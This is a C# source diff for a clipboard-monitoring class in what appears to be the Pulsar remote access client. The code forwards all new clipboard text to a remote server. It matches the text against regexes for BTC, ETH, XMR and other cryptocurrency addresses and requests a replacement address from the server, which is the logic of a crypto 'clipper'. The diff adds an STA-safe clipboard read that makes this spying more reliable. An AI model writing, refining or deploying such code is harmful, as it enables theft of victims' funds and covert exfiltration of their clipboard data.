@@ -19,7 +19,7 @@ namespace Pulsar.Client.User
         private readonly SynchronizationContext _syncContext;
         private string _lastClipboardText = "";
         private bool _isEnabled = false;
-        
+
         private const int WM_CLIPBOARDUPDATE = 0x031D;
 
         [DllImport("user32.dll", SetLastError = true)]
@@ -34,17 +34,15 @@ namespace Pulsar.Client.User
             _regexPatterns = new List<Tuple<string, Regex>>
             {
                 // the regex is made by chatgpt so like idk if they ALWAYS work, but they should
-
-                new Tuple<string, Regex>("BTC", new Regex(@"^(1|3|bc1)[a-zA-Z0-9]{25,39}$")),      // BTC regex
-                new Tuple<string, Regex>("LTC", new Regex(@"^(L|M|3)[a-zA-Z0-9]{26,33}$")),        // LTC regex
-                new Tuple<string, Regex>("ETH", new Regex(@"^0x[a-fA-F0-9]{40}$")),                // ETH regex
-                new Tuple<string, Regex>("XMR", new Regex(@"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$")), // XMR regex
-                new Tuple<string, Regex>("SOL", new Regex(@"^[1-9A-HJ-NP-Za-km-z]{32,44}$")),      // SOL regex
-                new Tuple<string, Regex>("DASH", new Regex(@"^X[1-9A-HJ-NP-Za-km-z]{33}$")),       // DASH regex
-                new Tuple<string, Regex>("XRP", new Regex(@"^r[0-9a-zA-Z]{24,34}$")),              // XRP regex
-                new Tuple<string, Regex>("TRX", new Regex(@"^T[1-9A-HJ-NP-Za-km-z]{33}$")),        // TRX regex
-                new Tuple<string, Regex>("BCH", new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$"))  // BCH regex
-
+                new Tuple<string, Regex>("BTC",  new Regex(@"^(1|3|bc1)[a-zA-Z0-9]{25,39}$")),
+                new Tuple<string, Regex>("LTC",  new Regex(@"^(L|M|3)[a-zA-Z0-9]{26,33}$")),
+                new Tuple<string, Regex>("ETH",  new Regex(@"^0x[a-fA-F0-9]{40}$")),
+                new Tuple<string, Regex>("XMR",  new Regex(@"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$")),
+                new Tuple<string, Regex>("SOL",  new Regex(@"^[1-9A-HJ-NP-Za-km-z]{32,44}$")),
+                new Tuple<string, Regex>("DASH", new Regex(@"^X[1-9A-HJ-NP-Za-km-z]{33}$")),
+                new Tuple<string, Regex>("XRP",  new Regex(@"^r[0-9a-zA-Z]{24,34}$")),
+                new Tuple<string, Regex>("TRX",  new Regex(@"^T[1-9A-HJ-NP-Za-km-z]{33}$")),
+                new Tuple<string, Regex>("BCH",  new Regex(@"^(bitcoincash:)?(q|p)[a-z0-9]{41}$"))
             };
             _syncContext = SynchronizationContext.Current;
 
@@ -82,66 +80,103 @@ namespace Pulsar.Client.User
             base.WndProc(ref m);
         }
 
+        // === STA-safe clipboard read ===
+        private string GetClipboardTextSafe()
+        {
+            string result = "";
+            Exception error = null;
+            using (ManualResetEvent done = new ManualResetEvent(false))
+            {
+                Thread t = new Thread(() =>
+                {
+                    try
+                    {
+                        if (Clipboard.ContainsText())
+                            result = Clipboard.GetText();
+                    }
+                    catch (Exception ex)
+                    {
+                        error = ex;
+                    }
+                    finally
+                    {
+                        done.Set();
+                    }
+                });
+
+                t.SetApartmentState(ApartmentState.STA);
+                t.IsBackground = true;
+                t.Start();
+
+                // avoid hanging forever
+                if (!done.WaitOne(1000))
+                {
+                    Debug.WriteLine("ClipboardChecker: STA clipboard read timed out");
+                    return "";
+                }
+            }
+
+            if (error != null)
+            {
+                Debug.WriteLine("ClipboardChecker: STA clipboard error: " + error.Message);
+                return "";
+            }
+
+            return result ?? "";
+        }
+
         private void ClipboardCheck(bool forceSend = false)
         {
             try
             {
-                if (Clipboard.ContainsText())
+                string clipboardText = GetClipboardTextSafe();
+                if (string.IsNullOrEmpty(clipboardText))
+                    return;
+
+                bool isNewText = clipboardText != _lastClipboardText;
+                bool shouldProcess = isNewText || forceSend;
+
+                Debug.WriteLine($"Is new text: {isNewText}, Force send: {forceSend}");
+
+                if (shouldProcess)
                 {
-                    string clipboardText = "";
-                    try
+                    _lastClipboardText = clipboardText;
+
+                    bool isClipperAddress = Messages.ClipboardHandler._cachedAddresses.Contains(clipboardText);
+
+                    bool wasRecentlyReceivedFromServer =
+                        Messages.ClipboardHandler._lastReceivedClipboardText.Equals(clipboardText) &&
+                        (DateTime.Now - Messages.ClipboardHandler._lastReceivedTime).TotalSeconds < 2;
+
+                    if (forceSend)
                     {
-                        clipboardText = Clipboard.GetText();
-                    } catch
-                    {
-                        return;
+                        wasRecentlyReceivedFromServer = false;
                     }
 
-                    bool isNewText = clipboardText != _lastClipboardText;
-                    bool shouldProcess = isNewText || forceSend;
+                    Debug.WriteLine($"Is clipper address: {isClipperAddress}, Was from server recently: {wasRecentlyReceivedFromServer}");
 
-                    Debug.WriteLine($"Is new text: {isNewText}, Force send: {forceSend}");
-                    
-                    if (shouldProcess)
+                    if (!isClipperAddress && !wasRecentlyReceivedFromServer)
                     {
-                        _lastClipboardText = clipboardText;
+                        Debug.WriteLine(forceSend && !isNewText
+                            ? "Clipboard sync enabled, sending current clipboard snapshot to server..."
+                            : "New clipboard text detected, notifying server...");
+                        Debug.WriteLine($"Client detected clipboard change: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
 
-                        bool isClipperAddress = Messages.ClipboardHandler._cachedAddresses.Contains(clipboardText);
-                        
-                        bool wasRecentlyReceivedFromServer = 
-                            Messages.ClipboardHandler._lastReceivedClipboardText.Equals(clipboardText) &&
-                            (DateTime.Now - Messages.ClipboardHandler._lastReceivedTime).TotalSeconds < 2;
+                        _client.Send(new SetUserClipboardStatus { ClipboardText = clipboardText });
 
-                        if (forceSend)
+                        foreach (var pattern in _regexPatterns)
                         {
-                            wasRecentlyReceivedFromServer = false;
-                        }
-
-                        Debug.WriteLine($"Is clipper address: {isClipperAddress}, Was from server recently: {wasRecentlyReceivedFromServer}");
-                        
-                        if (!isClipperAddress && !wasRecentlyReceivedFromServer)
-                        {
-                            Debug.WriteLine(forceSend && !isNewText
-                                ? "Clipboard sync enabled, sending current clipboard snapshot to server..."
-                                : "New clipboard text detected, notifying server...");
-                            Debug.WriteLine($"Client detected clipboard change: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
-
-                            _client.Send(new SetUserClipboardStatus { ClipboardText = clipboardText });
-
-                            foreach (var pattern in _regexPatterns)
+                            if (pattern.Item2.IsMatch(clipboardText))
                             {
-                                if (pattern.Item2.IsMatch(clipboardText))
-                                {
-                                    Debug.WriteLine($"Crypto address detected: {pattern.Item1}");
-                                    _client.Send(new DoGetAddress { Type = pattern.Item1 });
-                                    break;
-                                }
+                                Debug.WriteLine($"Crypto address detected: {pattern.Item1}");
+                                _client.Send(new DoGetAddress { Type = pattern.Item1 });
+                                break;
                             }
                         }
-                        else
-                        {
-                            Debug.WriteLine("Clipboard change ignored (clipper address or from server sync)");
-                        }
+                    }
+                    else
+                    {
+                        Debug.WriteLine("Clipboard change ignored (clipper address or from server sync)");
                     }
                 }
             }
